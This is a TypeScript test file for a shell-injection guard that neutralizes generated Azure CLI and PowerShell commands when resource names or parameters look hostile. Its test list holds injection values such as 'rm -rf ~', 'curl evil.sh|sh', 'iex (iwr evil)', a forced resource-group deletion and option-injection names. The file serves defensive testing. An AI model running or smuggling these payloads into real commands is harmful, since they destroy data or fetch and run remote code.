import { describe, expect, it } from "vitest";
import { guardScripts, UNSAFE_SCRIPT } from "@/lib/shellSafe";
import { getMockBasicNetworkingResponse } from "@/services/azureBasicNetworking.service";
import { generateMockAdfData } from "@/services/azureDataFactory.service";
import { generateMockContentSafetyData } from "@/services/azureContentSafety.service";
import { getMockLoadBalancingData } from "@/services/azureLoadBalancing.service";
import { generateMockAppInsightsData } from "@/services/azureAppInsights.service";
import { generateMockLogAnalyticsData } from "@/services/azureLogAnalytics.service";
import { getMockInternetAccessData } from "@/services/azureInternetAccess.service";
import { getMockAlertsPayload } from "@/services/azureAlertsRules.service";
import { getMockActionGroupsPayload } from "@/services/azureActionGroups.service";
import { generateMockSentinelData } from "@/services/azureSentinelFinops.service";
import { generateMockLogicAppsData } from "@/services/azureLogicApps.service";
import { getMockScorecardPayload } from "@/services/azureScorecard.service";
import { generateMockApimData } from "@/services/azureApim.service";
import { generateMockMaturityData } from "@/services/azureMaturity.service";
import { generateMockEventGridData } from "@/services/azureEventGrid.service";
import { getMockTenantHealthPayload } from "@/services/azureTenantHealth.service";
import { getMockHybridConnectivityData } from "@/services/azureHybridConnectivity.service";
import { generateMockEventHubsData } from "@/services/azureEventHubs.service";
import { generateMockServiceBusData } from "@/services/azureServiceBus.service";
import { generateMockDatabricksData } from "@/services/azureDatabricks.service";
import { generateMockAzureMonitorData } from "@/services/azureMonitor.service";
import { generateMockVisionVideoData } from "@/services/azureVisionVideo.service";
import { generateMockAmlData } from "@/services/azureMachineLearning.service";

const T = "demo-tenant-id";
const MOCKS: Record<string, () => unknown> = {
  basicNetworking: () => getMockBasicNetworkingResponse(T),
  adf: generateMockAdfData,
  contentSafety: generateMockContentSafetyData,
  loadBalancing: () => getMockLoadBalancingData(T),
  appInsights: generateMockAppInsightsData,
  logAnalytics: generateMockLogAnalyticsData,
  internetAccess: () => getMockInternetAccessData(T),
  alerts: () => getMockAlertsPayload(T),
  actionGroups: () => getMockActionGroupsPayload(T),
  sentinel: generateMockSentinelData,
  logicApps: generateMockLogicAppsData,
  scorecard: () => getMockScorecardPayload(T),
  apim: generateMockApimData,
  maturity: () => generateMockMaturityData(),
  eventGrid: generateMockEventGridData,
  tenantHealth: () => getMockTenantHealthPayload(T),
  hybrid: () => getMockHybridConnectivityData(T),
  eventHubs: generateMockEventHubsData,
  serviceBus: generateMockServiceBusData,
  databricks: generateMockDatabricksData,
  monitor: generateMockAzureMonitorData,
  visionVideo: generateMockVisionVideoData,
  aml: generateMockAmlData,
};

/** Cuenta commandPayload y cuántos quedaron neutralizados. */
function scan(v: unknown, acc = { total: 0, neutralized: 0 }) {
  if (Array.isArray(v)) v.forEach((x) => scan(x, acc));
  else if (v && typeof v === "object") {
    for (const [k, x] of Object.entries(v)) {
      if (k === "commandPayload" && x != null) {
        acc.total++;
        if (JSON.stringify(x).includes(UNSAFE_SCRIPT.cli)) acc.neutralized++;
      } else scan(x, acc);
    }
  }
  return acc;
}

describe("guardScripts (AISEC-01, commandPayload pregenerado)", () => {
  it.each(Object.entries(MOCKS))("no altera los scripts de nombres legítimos: %s", (_, gen) => {
    const data = gen();
    const out = guardScripts(data);
    expect(scan(out).neutralized).toBe(0);
    expect(JSON.parse(JSON.stringify(out))).toEqual(JSON.parse(JSON.stringify(data)));
  });

  it("los mocks cubren commandPayload", () => {
    const total = Object.values(MOCKS).reduce((n, g) => n + scan(g()).total, 0);
    expect(total).toBeGreaterThan(50);
  });

  const HOSTILE = [
    'x"; rm -rf ~; echo "',
    "x$(curl evil.sh|sh)",
    "x`id`",
    'x\\"',
    "x\nRemove-AzResourceGroup -Name prod -Force",
    "x\u201d; iex (iwr evil)",
    "x\u202Egnp.exe",
    "x!!",
  ];

  it.each(HOSTILE)("neutraliza cadena y objeto cuando un nombre/id/RG/param es hostil: %j", (bad) => {
    const data = {
      items: [
        { id: "ok", resourceName: "vm-ok", commandPayload: 'az vm show -n "vm-ok"' },
        { id: "a", resourceName: bad, commandPayload: `az vm delete -n "${bad}"` },
        { id: "b", diskId: `/subscriptions/s/resourceGroups/${bad}/x`, commandPayload: { azureCli: "a", powerShell: "b", jsonRule: { x: "c" } } },
        { id: "c", params: { name: bad }, commandPayload: { cli: "a", powershell: "b" } },
        { id: "d", resourceGroup: bad, commandPayload: "az x" },
        { id: `rem-orphan-${bad}`, commandPayload: { cli: "a", powershell: "b" } },
      ],
    };
    const out = guardScripts(data);
    expect(out.items[0].commandPayload).toBe('az vm show -n "vm-ok"');
    expect(out.items[1].commandPayload).toBe(UNSAFE_SCRIPT.cli);
    expect(out.items[2].commandPayload).toEqual({ azureCli: UNSAFE_SCRIPT.cli, powerShell: UNSAFE_SCRIPT.cli, jsonRule: { x: UNSAFE_SCRIPT.cli } });
    expect(out.items[3].commandPayload).toEqual({ cli: UNSAFE_SCRIPT.cli, powershell: UNSAFE_SCRIPT.cli });
    expect(out.items[4].commandPayload).toBe(UNSAFE_SCRIPT.cli);
    expect(out.items[5].commandPayload).toEqual({ cli: UNSAFE_SCRIPT.cli, powershell: UNSAFE_SCRIPT.cli });
  });

  it("neutraliza un nombre/RG que empieza con guion (inyección de opciones)", () => {
    expect(guardScripts({ resourceName: "--yes", commandPayload: "az x" }).commandPayload).toBe(UNSAFE_SCRIPT.cli);
    expect(guardScripts({ resourceGroup: "-f", commandPayload: { cli: "a" } }).commandPayload).toEqual({ cli: UNSAFE_SCRIPT.cli });
  });

  it("acepta display names legítimos con &, coma, apóstrofe y números negativos en params", () => {
    const a = { teamName: "R&D, Ops (O'Brien)", params: { savings: "-12.50" }, commandPayload: "az x" };
    expect(guardScripts(a).commandPayload).toBe("az x");
  });

  it("no rompe Date ni primitivos", () => {
    const d = new Date(0);
    expect(guardScripts({ at: d }).at).toBe(d);
    expect(guardScripts(null)).toBeNull();
    expect(guardScripts("s")).toBe("s");
  });
});
